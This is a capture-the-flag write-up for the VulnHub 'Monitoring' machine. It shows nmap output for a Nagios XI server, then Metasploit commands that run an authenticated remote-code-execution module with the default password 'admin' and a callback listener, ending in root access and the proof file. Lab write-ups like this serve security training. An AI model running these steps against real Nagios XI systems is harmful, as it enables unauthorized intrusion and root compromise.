---
description: VulnHub Monitoring machine writeup
cover: ../.gitbook/assets/image (21).png
coverY: 0
---

# \[Easy] Monitoring

### Recon:

<pre class="language-c"><code class="lang-c">PORT    STATE SERVICE  VERSION
<strong>22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
</strong>| ssh-hostkey: 
|   2048 b88c40f65f2a8bf792a8814bbb596d02 (RSA)
|   256 e7bb11c12ecd3991684eaa01f6dee619 (ECDSA)
|_  256 0f8e28a7b71d60bfa62bdda36dd14ea4 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_sslv2: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Issuer: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-09-08T18:28:08
| Not valid after:  2030-09-06T18:28:08
| MD5:   20f0951f8eff1b69ef3f1b1efb4c361f
|_SHA-1: cc400ad760cf49591c92d9ab0f06106c18f66661
| tls-alpn: 
|_  http/1.1
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>

### Web

#### Homepage

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

#### Login page

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Use a <mark style="color:yellow;">`nagios_xi_plugins_check_plugin_authenticated_rce`</mark> module in Metasploit:

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Set options:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```bash
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set RHOSTS 192.168.125.136
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set SRVHOST tun0
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set PASSWORD admin
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set LHOST tun0
```

Run and get root and flag by way <mark style="color:yellow;">`/root/proof.txt`</mark>:

<figure><img src="../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
